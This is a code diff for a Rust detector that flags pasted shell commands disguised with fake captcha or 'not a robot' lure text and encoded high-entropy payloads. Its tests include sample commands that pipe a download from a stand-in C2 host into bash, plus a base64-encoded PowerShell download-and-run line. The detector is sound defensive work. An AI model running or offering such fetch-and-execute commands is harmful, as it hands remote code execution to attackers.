@@ -64,8 +64,32 @@ static DECOY_KEYWORDS: LazyLock<Regex> = LazyLock::new(|| {
 static SPLIT: LazyLock<Regex> =
     LazyLock::new(|| re(r"[^\S\r\n]#|[^\S\r\n]::[^\S\r\n]|[^\S\r\n]+rem[^\S\r\n]|[^\S\r\n]{8,}"));
 
-/// Blank lines between a command and its final line that count as hiding the command.
-const MIN_PADDING_BLANK_LINES: usize = 3;
+/// Phrases that only appear in lure text aimed at the victim. Unlike the general keywords
+/// ("verify", "confirm", "reference"), they almost never occur in output, scripts or docs,
+/// so they count on any later line of a multi-line paste.
+static STRONG_DECOY: LazyLock<Regex> = LazyLock::new(|| {
+    re(
+        r"\bnot\s+a\s+robot\b|\bi\s*'?\s*a?m\s+not\s+a\b|\byou\s+are\s+(?:a\s+)?human\b|captcha|cloudflare|\bray\s*id\b|identificator|\bverification\s+(?:id|code)\b|\bsecurity\s+check\b|\baccess\s+code\b|✅|✔",
+    )
+});
+
+/// A line that names an interpreter as a command, not as a value in JSON or YAML output.
+fn command_line(line: &str) -> bool {
+    let t = line.trim_start();
+    has_interpreter_token(line) && !t.starts_with(['"', '\'', '{', '['])
+}
+
+/// A later line where lure text sits: a comment, a line pushed right by padding, or the
+/// last line of the paste.
+fn decoy_line(line: &str, is_last: bool) -> bool {
+    let t = line.trim_start();
+    let indent = line.len() - t.len();
+    is_last
+        || t.starts_with('#')
+        || t.starts_with("::")
+        || t.to_ascii_lowercase().starts_with("rem ")
+        || indent >= 8
+}
 
 fn prose_words(s: &str) -> usize {
     s.split(|c: char| !c.is_alphanumeric())
@@ -79,10 +103,12 @@ fn prose_words(s: &str) -> usize {
 /// Run dialog shows only the tail of a long line). Requires an interpreter token in the
 /// head so a plain `ls # list files` never fires.
 ///
-/// Head and tail are compared within one line, so an interpreter named on one line of a
-/// transcript or JSON document says nothing about text on a later line. The only
-/// multi-line shape that counts is a command followed by a single final line of prose:
-/// either two non-blank lines, or a last line pushed down by a run of blank lines.
+/// Two shapes count:
+/// - **Same line:** prose after a comment marker or padding on the command's own line.
+///   Any decoy keyword counts here.
+/// - **Later line:** a comment, a padded line or the last line, after a line that runs an
+///   interpreter (not one that merely names it as a JSON or YAML value). Only strong lure
+///   phrases count here, so transcripts, JSON output and documented installers stay quiet.
 pub fn trailing_decoy_prose(text: &str) -> Option<String> {
     let t = text.trim_end();
     let lines: Vec<&str> = t.split(['\n', '\r']).collect();
@@ -100,28 +126,41 @@ pub fn trailing_decoy_prose(text: &str) -> Option<String> {
         }
     }
 
+    // On later lines only strong lure phrases count: a weak word ("verify", "confirm")
+    // in the comment after an installer command is ordinary documentation.
     let last_idx = lines.iter().rposition(|l| !l.trim().is_empty())?;
-    let last = lines[last_idx];
-    let before = &lines[..last_idx];
-    let commands = before.iter().filter(|l| !l.trim().is_empty()).count();
-    let blank_run = before
+    let first_cmd = lines.iter().position(|l| command_line(l))?;
+    lines[first_cmd + 1..]
         .iter()
-        .rev()
-        .take_while(|l| l.trim().is_empty())
-        .count();
-    if (commands == 1 || (commands > 1 && blank_run >= MIN_PADDING_BLANK_LINES))
-        && before.iter().any(|l| has_interpreter_token(l))
-        && prose_words(last) >= 3
-        && DECOY_KEYWORDS.is_match(last)
-    {
-        return Some(last.trim().chars().take(80).collect());
-    }
-    None
+        .enumerate()
+        .find(|(i, l)| {
+            decoy_line(l, first_cmd + 1 + i == last_idx)
+                && prose_words(l) >= 3
+                && STRONG_DECOY.is_match(l)
+        })
+        .map(|(_, l)| l.trim().chars().take(80).collect())
 }
 
-// `:` splits too: base64 and hex never contain it, while ARNs, image references and
-// similar colon-delimited identifiers would otherwise read as one high-entropy blob.
-static TOKEN_SPLIT: LazyLock<Regex> = LazyLock::new(|| re(r#"[\s'"(),;:|&<>`{}\[\]]+"#));
+static TOKEN_SPLIT: LazyLock<Regex> = LazyLock::new(|| re(r#"[\s'"(),;|&<>`{}\[\]]+"#));
+static ARN_URN: LazyLock<Regex> = LazyLock::new(|| re(r"(?:^|[^a-z0-9])(?:arn|urn):"));
+
+/// The parts of a token to measure. A colon-delimited identifier (an ARN or URN, or any
+/// single-case token such as an IPv6 address, a fingerprint or an image reference) is
+/// measured piece by piece, since joined it reads as one random blob. Anything else,
+/// including a mixed-case blob chopped up with colons, is measured whole: base64 is
+/// mixed-case, so inserting `:` does not hide it.
+fn entropy_units(token: &str) -> Vec<&str> {
+    if !token.contains(':') {
+        return vec![token];
+    }
+    let mixed = token.bytes().any(|b| b.is_ascii_uppercase())
+        && token.bytes().any(|b| b.is_ascii_lowercase());
+    if ARN_URN.is_match(token) || !mixed {
+        token.split(':').collect()
+    } else {
+        vec![token]
+    }
+}
 
 /// Entropy contributes only when an interpreter token is present in the same observation.
 /// JWTs, PEM blocks, .env values and minified JS are high entropy and benign.
@@ -131,6 +170,7 @@ pub fn gated_entropy(text: &str, min_len: usize, min_bits: f64) -> Option<String
     }
     TOKEN_SPLIT
         .split(text)
+        .flat_map(entropy_units)
         .filter(|t| t.len() >= min_len)
         .find(|t| shannon_entropy(t) >= min_bits)
         .map(|t| {
@@ -201,6 +241,43 @@ mod tests {
 }"#;
         assert!(trailing_decoy_prose(transcript).is_none());
         assert!(gated_entropy(transcript, 32, 4.5).is_none());
+    }
+
+    #[test]
+    fn strong_lure_phrases_count_on_later_lines() {
+        let l = "curl -fsSL https://c2.invalid/m | bash";
+        for t in [
+            format!("cd /tmp\n{l}\n# I am not a robot - reCAPTCHA Verification ID: 2165"),
+            format!("cd /tmp\n{l}\n              Cloud Identificator: 2031 press enter"),
+            format!("{l}\n# I am not a robot\n# Verification ID: 2165"),
+            format!("{l}\n# I am not a robot - reCAPTCHA\necho done"),
+        ] {
+            assert!(trailing_decoy_prose(&t).is_some(), "{t:?}");
+        }
+        // Weak words on later lines of a script stay quiet.
+        assert!(trailing_decoy_prose(&format!(
+            "cd app\n{l}\n# verify the install and confirm the version\necho done"
+        ))
+        .is_none());
+        // An interpreter named only in JSON output is not a command line.
+        assert!(trailing_decoy_prose(
+            "{\n  \"run\": \"python3\",\n  \"note\": \"captcha service, not a robot farm\"\n}"
+        )
+        .is_none());
+    }
+
+    #[test]
+    fn entropy_measures_mixed_case_colon_blobs_whole() {
+        // base64("iex (iwr https://c2.invalid/x)") chopped with colons.
+        let blob = "python3 x.py aWV4IChp:d3IgaHR0:cHM6Ly9j:Mi5pbnZh:bGlkL3gp:Yk9xUjZ3";
+        assert!(gated_entropy(blob, 32, 4.5).is_some());
+        for id in [
+            "python3 a.py 2001:0db8:85a3:0000:0000:8a2e:0370:7334:fe80:0000:0202:b3ff",
+            "bash a.sh AA:BB:CC:DD:EE:FF:00:11:22:33:44:55:66:77:88:99:AA:BB:CC:DD",
+            "python3 a.py --role-arn=arn:aws:iam::111122223333:role/Example_LmlJElh73Trigger",
+        ] {
+            assert!(gated_entropy(id, 32, 4.5).is_none(), "{id}");
+        }
     }
 
     #[test]
